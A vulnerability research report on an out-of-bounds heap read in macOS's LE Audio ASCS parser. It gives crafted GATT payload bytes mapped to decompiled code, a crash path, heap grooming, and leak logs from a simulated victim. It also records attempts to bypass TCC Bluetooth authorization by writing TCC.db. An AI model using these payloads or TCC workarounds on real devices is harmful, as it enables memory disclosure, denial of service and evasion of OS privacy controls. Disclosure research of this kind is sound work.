# LE Audio ASCS OOB-Read PoC — static evidence & runtime report

All `re_bluetoothaudiod.c` references are to `research/wireless/decomp/re_bluetoothaudiod.c`
(Ghidra decompilation of `/usr/libexec/bluetoothaudiod`, arm64e). CoreBluetooth
string-table references are to `research/wireless/decomp/CoreBluetooth.c`.
Parent finding: `audits/xpc_sweep_findings.md` finding 2 (`:17-21`).

## 1. Attack parameter → decompiled line map

### 1.1 How a write reaches the parser

| Parameter | Decompiled location | Evidence |
|---|---|---|
| Write target = ASE Control Point 0x2B86 | `re_bluetoothaudiod.c:35580-35584` | `receivedWriteRequest:` logs "ASCS received write request for characteristic CBUUIDASEControlPointCharacteristicString" and builds a `DataInputStream` over the written value |
| Opcode dispatch (opcode 1 → codec config) | `re_bluetoothaudiod.c:35586-35592` | `readUint8_` into `local_70`; `uVar5 == 1` → `codecConfigRequest_(param_1, IVar3)` (2 → `qosConfigRequest_`, 3 → `enableRequest_`, ...) |
| Function entry | `re_bluetoothaudiod.c:35721` header, body @`10003344c` | `ASCSServerService::codecConfigRequest:` (2420 bytes) |

### 1.2 Command header (per-ASE, exactly what `attack.swift` emits)

| Wire field | Attack bytes (payload 1) | Decompiled location |
|---|---|---|
| opcode | `0x01` | `:35586-35592` (dispatch above) |
| numASE (`local_91`) | `0x01` | `:35765-35766` `readUint8_` |
| ASE_ID (`local_94`) | `0x01` | `:35802-35803` `readUint8_` (logged "Configuring Codec for ASE %u" `:35809-35816`) |
| target latency (`local_95`) | `0x02` | `:35818-35822` `readUint8_` → `setTargetLatency_` |
| preferred PHY (`local_96`) | `0x02` | `:35823-35827` `readUint8_` → `setPreferredPhy_` |
| codec ID, 5 bytes LE (`readUint40_`) | `06 00 00 00 00` | `:35828-35837` → `setCodecID_` |
| **declared config length (`local_97`)** | payload 1: `0x40` (64); payload 2: `0xF0` (240) | `:35838` `readUint8_` — attacker byte, ≤ 255 |
| config bytes | payload 1: 64; payload 2: 3 | `:35839-35842` `readNumBytes_toData_(stream, local_97, NSMutableData)` |

### 1.3 Why a truncated write leaves the parser OOB

`DataInputStream::readNumBytes_toData_` @`10002cf50`, body `re_bluetoothaudiod.c:31234-31261`:
zeroes a stack buffer of the requested size, `read:maxLength:`es it, and — critically —
`if (IVar1 == uVar2) appendBytes_length_` (`:31250-31252`): the config `NSMutableData`
receives bytes **only on a fully successful read**. A write that carries fewer config
bytes than `local_97` declares leaves the data **empty**, while the parse loop still
runs `while ((int)uVar12 < (int)(uint)local_97)` (`:35880`). The decompile itself notes
`IVar5 = objc_stub::bytes(IVar6)` (`:35843-35844`) is then a zero-length backing
store — every indexed read is out of bounds from index 0.

### 1.4 TLV loop and the two OOB copies

Decompile wire order (as decompiled — NOT the Bluetooth SIG ASCS layout): each record
is `[len][type][value...]` — length byte at `data[idx]`, type byte at `data[idx+1]`,
value at `data[idx+2]`:

| Element | Decompiled location | Code |
|---|---|---|
| type byte | `:35846` | `bVar2 = *(byte *)(IVar5 + 1 + uVar12)` |
| length byte (types ≥ 3 only) | `:35862` | `bVar3 = *(byte *)(IVar5 + uVar12)` |
| type 1 / 2 / 5 (1-byte values) | `:35847-35851`, `:35853-35857`, `:35876-35881` | advance `idx+3`; length byte ignored |
| **type 3 → channel-alloc mask** | `:35863-35868` | `___memcpy_chk(&local_9c, IVar5 + uVar1, bVar3, 4)` — copies **attacker length `bVar3`** (fortified to ≤ 4) from an offset that may lie past the buffer end; advance `(idx+2)+bVar3` (`:35884`) |
| **type 4 → octets-per-frame** | `:35869-35875` | `local_9c &= 0xffff0000; ___memcpy_chk(&local_9c, IVar5 + uVar1, bVar3 - 1, 2)` — copies **`bVar3 - 1`** bytes (`bVar3 == 0` wraps the `byte→ulong` promotion to `2^64-1` → `__chk_fail` abort = DoS); advance `(idx+2)+bVar3` |
| unknown type | `:35871/35882` | advance `idx+2` |
| loop bound | `:35880` | `while ((int)uVar12 < (int)(uint)local_97)` — the **declared** length, never validated against the actual data length |

### 1.5 Echo back to the central

`re_bluetoothaudiod.c:35906-35920`: after parsing, the response is assembled with
`DataOutputStream::outputStreamWithByteOrder_(...,1)` and pushed with
`ServerCommonAudioProfile::updateValue_forCharacteristic_onSubscribedCentrals_`
onto **`ASEControlPointCharacteristic`** (0x2B86) — i.e. the parsed fields, including
whatever the OOB copies deposited into `local_9c`, travel back over GATT
notifications to the writing central. Per-ASE state notifications follow
(`:35921-35963`). Our victim echoes an instrumented superset of this on 0x2B86,
0x2B84 and 0x2B85 (format documented in `victim_peripheral.swift::ASCSEngine.echoData`).

### 1.6 GATT surface existence

`decomp/CoreBluetooth.c:60487-60579` — the DSC string table contains
`184B` (Common Audio Service, `:60488`), `2B84` (`:60572`), `2B85` (`:60574`),
`2B86` (`:60576`), `2B87` (`:60578`) — the ASCS service/characteristics exist in the
platform's CoreBluetooth stack.

## 2. PoC mirror fidelity

`victim_peripheral.swift` implements the decompiled parser 1:1 (`codecConfigParse`
with line comments mapping each branch to `:35843-35885`), with three documented
divergences:

1. **Clamped reads past the canary** (`HeapConfig.byte(at:)`): the real parser reads
   adjacent heap without any bound; the virtual victim clamps reads that would go
   past the canary object so the demo cannot fault. All reads inside the config
   object and inside the canary object are performed for real.
2. **`__memcpy_chk` overlong copies**: on-device, type-3 with `bVar3 > 4` or type-4
   with `bVar3 - 1 > 2` hits `__chk_fail` → process abort (DoS). The virtual victim
   logs "would __chk_fail abort" and clamps so the leak demo continues. Payload 2's
   canary walk triggered exactly this path (`type-4 len=230 ... would __chk_fail
   abort` in the selftest log) before the clamped-canary fix; with the current
   canary layout both payloads stay in leak territory.
3. **Echo is an instrumented superset** of the real response (per-TLV trace with a
   region tag: in-bounds / slack / canary / beyond) so the central can see exactly
   which bytes came from where.

The config buffer is a real `malloc` allocation; the canary is a **separate heap
object** placed by heap grooming (spray of 200k same-size-class allocations, then
select the pair that is exactly `allocSize` apart — `HeapConfig.init`). Reads past
the config object's end therefore cross a true object boundary.

## 3. Runtime gate checklist (why the real daemon is not the target)

Daemon entry gate, `re_bluetoothaudiod.c:50579-50646`:

- `CFPreferencesGetAppBooleanValue(&cf_enableHALEAudio, &cf_com_apple_bluetooth, ...)`
  (`:50586-50588`)
- `sysctlbyname("security.mac.amfi.developer_mode_status")` (`:50589-50591`)
- `__os_feature_enabled_impl("Accessibility","LeAudio")` (`:50604-50605`)
- Gate (`:50606-50625`): continues only if the OS feature is enabled **or**
  (`developer_mode_status == 1` **and** `enableHALEAudio == true`); otherwise logs
  *"LE Audio Feature not enabled exiting. OS Feature: %u. Hearing Aid Enabled: %u.
  Developer Mode: %u"* (`:50618-50622`) and `_exit(0)` (`:50625`).

Measured on this Mac (2026-10-14):

```
$ pgrep -l bluetoothaudiod || echo "bluetoothaudiod NOT running"
bluetoothaudiod NOT running
$ launchctl print gui/501/com.apple.bluetooth.bluetoothaudiod
Could not find service "com.apple.bluetooth.bluetoothaudiod" in domain for user gui: 501
$ sysctl security.mac.amfi.developer_mode_status
security.mac.amfi.developer_mode_status: 1
$ defaults read com.apple.bluetooth enableHALEAudio
The domain/default pair of (com.apple.bluetooth, enableHALEAudio) does not exist
```

Verdict: `developer_mode_status == 1` but `enableHALEAudio` is unset (and
`Accessibility/LeAudio` is not a provisioned OS feature here) → the `||`-chain fails
→ `bluetoothaudiod` exits at startup. That is why the rig attacks a simulated ASCS
server instead of the real daemon. Enabling the real daemon on a lab Mac would be:
`defaults write com.apple.bluetooth enableHALEAudio -bool true` (plus developer mode,
already 1) — left out of scope for this phase.

Local controller (this Mac): BCM_4387, State: On, `Supported services: ... LEA ...`
(`system_profiler SPBluetoothDataType`).

## 4. Loopback demonstration — what was tried and what blocks BLE transport

### 4.1 Same process — skipped by design

CoreBluetooth does not connect a `CBCentralManager` to a `CBPeripheralManager`
living in the same process; the assignment's fallback (two processes) was used
directly.

### 4.2 Two processes, same Mac — macOS does not loop back local advertisements

- Victim: `CBPeripheralManager` reached `.poweredOn` (state 5), added service 0x184B,
  `startAdvertising` returned **no error** ("advertising started — waiting for
  central").
- Attack: `CBCentralManager` `.poweredOn`, scanned for 0x184B for 50 s → zero
  discoveries, then unfiltered scan → many third-party advertisers (S19/S18/S41
  FindMy accessories, `[TV] UN40J6300`, PeakPhone at rssi −43…−50), **never**
  LEAUDIO-POC-VICTIM and never a 184B advertiser.
- A/B control: unfiltered scan with the victim **running** vs **stopped** shows an
  identical near-field environment (only PeakPhone / third-party entries) → the
  victim's advertisement is not routed to the same machine's central at all.
  Conclusion: this macOS build (Darwin 25.2.0, BCM_4387) does not deliver a local
  peripheral's advertisements to a local `CBCentralManager`; same-Mac BLE loopback
  is blocked at the platform layer, not by our code.

### 4.3 Two machines (both team-owned lab Macs) — TCC blocks ssh-spawned CLI

Tried `cembook` (Darwin 25.3.0, BCM_4388C2, BT On) and `feza-macbook-air`
(Darwin 25.5.0, BCM_4378, BT On), both reachable over ssh, binary deployed and run:

```
[victim] PM state: 3
[victim] FATAL: CoreBluetooth unauthorized (TCC) — loopback cannot run
```

- Identical on both. Granting via TCC.db is not possible remotely: on feza
  (passwordless sudo) `sudo sqlite3 /Library/Application Support/com.apple.TCC/TCC.db`
  reads fine but any INSERT fails with `attempt to write a readonly database (8)` —
  modern macOS only lets `tccd` write TCC.db. Running the victim as a **system
  LaunchDaemon** (`sudo launchctl bootstrap system ...`) is still unauthorized —
  `kTCCServiceBluetooth` applies regardless of session context.
- Unblock path (out of scope for this phase): grant
  System Settings → Privacy & Security → **Bluetooth** to the victim binary on a lab
  Mac with GUI access (a one-time prompt), or run the victim from a GUI-launched app
  bundle. The rig is otherwise ready — both binaries compile and the full bug chain
  is proven at the ATT-payload boundary (§5).

### 4.4 What the BLE-mode binaries do once a remote central/peripheral pair is available

`victim_peripheral` advertises 0x184B (name `LEAUDIO-POC-VICTIM`, safety marker),
serves 0x2B84/0x2B85/0x2B86, and mirrors the decompile's write path.
`attack` scans for 0x184B, connects **only** to the exact local name
`LEAUDIO-POC-VICTIM` (third-party advertisers are logged passively and ignored),
discovers 0x2B86, subscribes to 0x2B84/0x2B85/0x2B86 notifications, writes both
crafted payloads, and greps every echoed config for the canary magic.

## 5. Direct-feed selftest (full bug chain, BLE transport bypassed)

Because the transport is platform-blocked (§4), the selftest drives the REAL parser
with the REAL attack payloads across the ATT-payload boundary:
`attack --print-payloads` → `victim_peripheral --parse <hex> ...`.
Full log: `selftest_output.txt` (194 lines). Highlights:

Payload 1 — complete write, declared = actual = 64 = exact malloc size, trailing
type-3 TLV header at config idx 62, memcpy source = idx+2 = 64 = **first byte of the
adjacent canary object**:

```
[victim] === payload (75 B): 01 01 01 02 02 06 00 00 00 00 40 01 01 08 ... 00 2a 04 03 ===
[victim] ASE 1: latency=2 phy=2 codecID=06 00 00 00 00 declared=64 actualConfigBytes=64 materialized=64
[victim] heap: config=0x0000000975064f00 logical=64 alloc=64 canary=0x0000000975064f40 distance=64 adjacent=true
[victim] parsed: sf=27 fd=0 framesPerSDU=0 chanAlloc=ca fe ba be octets=00 00 tlvs=22
[victim]   tlv[21] len=0x4 type=0x3 region=canary copy=ca fe ba be
[victim] heap OOB reads: canary=4 slack=0 beyondCanary(clamped)=0
[victim] *** CANARY MAGIC CA FE BA BE read OOB into channelAllocMask — cross-boundary leak CONFIRMED ***
[victim] echo (106 B): 01 01 01 01 1b 00 00 ca fe ba be 00 00 16 ...
[victim] >>> CANARY MAGIC CA FE BA BE present in echoed bytes at offset 7 <<<
```

Payload 2 — truncated write, declared 240 vs 3 actual bytes → `readNumBytes_toData_`
appends nothing (`materialized=0`), parser walks the empty buffer through malloc
slack (0xCC poison) into the canary object and copies canary bytes twice:

```
[victim] ASE 1: ... declared=240 actualConfigBytes=3 materialized=0  <-- TRUNCATED (empty buffer, parser still runs to declared)
[victim] heap: config=0x000000097509c300 logical=0 alloc=16 canary=0x000000097509c310 distance=16 adjacent=true
[victim]   tlv[8]  len=0xca type=0xfe region=canary
[victim]   tlv[9]  len=0xba type=0xbe region=canary
[victim]   tlv[10] len=0x4 type=0x3 region=canary copy=ca fe ba be
[victim]   tlv[11] len=0x4 type=0x3 region=canary copy=ca fe ba be
[victim] heap OOB reads: canary=16 slack=16 beyondCanary(clamped)=106
[victim] *** CANARY MAGIC CA FE BA BE read OOB into channelAllocMask — cross-boundary leak CONFIRMED ***
[victim] >>> CANARY MAGIC CA FE BA BE present in echoed bytes at offset 7 <<<
[victim] === SELFTEST VERDICT: PASSED — canary magic crossed the heap boundary into parsed+echoed codec fields ===
```

Both paths demonstrate the acceptance criterion: the crafted write triggers the OOB
read, the canary magic appears in the echoed bytes, and the walk/echo behaviour
matches the decompile (`local_97` bound `:35880`, `bVar3` copies `:35863-35875`,
echo `:35906-35920`).

## 6. Safety accounting

- All PoC execution ran against `victim_peripheral` on this Mac (direct-feed and
  advertising); the attempted two-machine run used only team Macs (cembook,
  feza-macbook-air) as the victim side, never as attack targets of third parties.
- `attack` and `scanall` perform passive receive-only scanning of the radio
  environment; connections are gated on the exact victim local name.
- Remote machines were cleaned up after the attempts (LaunchDaemon removed,
  `~/leaudio_poc` removed) — see the cleanup commands in the session log.
